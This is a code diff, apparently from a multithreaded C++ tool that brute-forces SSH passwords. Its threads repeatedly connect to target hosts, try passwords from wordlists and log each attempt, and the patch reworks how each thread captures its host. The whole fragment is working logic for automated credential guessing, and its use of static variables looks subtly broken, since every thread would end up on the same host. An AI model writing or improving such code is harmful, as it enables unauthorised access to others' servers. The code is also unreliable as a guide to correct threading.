@@ -111,19 +111,20 @@ int main(int argc, char** argv)
         for(uint16_t i = 1; i <= num_of_threads_per_host; i++)
         {
             //add all threads to the vector of threads 
-            threads.push_back(new std::thread([&](){
+            threads.push_back(new std::thread([host_index, &hosts, &port, &attempts_per_conn, &m_lock_pass, &attempt_counter, &wordlist_for_host, &user](){
                 static uint16_t this_host_index = host_index;
+                static std::string host = hosts[host_index];
                 char f_password[15];
                 while(true)
                 {
                     //basically create a new ssh connection and session, try [attempts_per_conn] passwords, then kill it
                     int handle;
-                    gau8::ssh* f_ssh = new gau8::ssh(hosts[this_host_index].c_str(), port, handle);
+                    gau8::ssh* f_ssh = new gau8::ssh(host.c_str(), port, handle);
                     while(handle)
                     {
                         //some ssh servers might refuse connections, so block the thread until 
                         delete f_ssh; 
-                        f_ssh = new gau8::ssh(hosts[this_host_index].c_str(), port, handle);
+                        f_ssh = new gau8::ssh(host.c_str(), port, handle);
                         std::this_thread::sleep_for(std::chrono::milliseconds(250));
                     }
                     for(uint16_t i = 1; i <= attempts_per_conn; i++)
@@ -139,7 +140,7 @@ int main(int argc, char** argv)
     
                         //try to authenticate via the username that the connection was created with and the password that was read above
                         
-                        std::string result_from_auth = "HOST: " + hosts[this_host_index] + " ATTEMPT: ";
+                        std::string result_from_auth = "ATTEMPT: ";
 
                         if(f_ssh->auth_user_pass(user, f_password))
                         {                
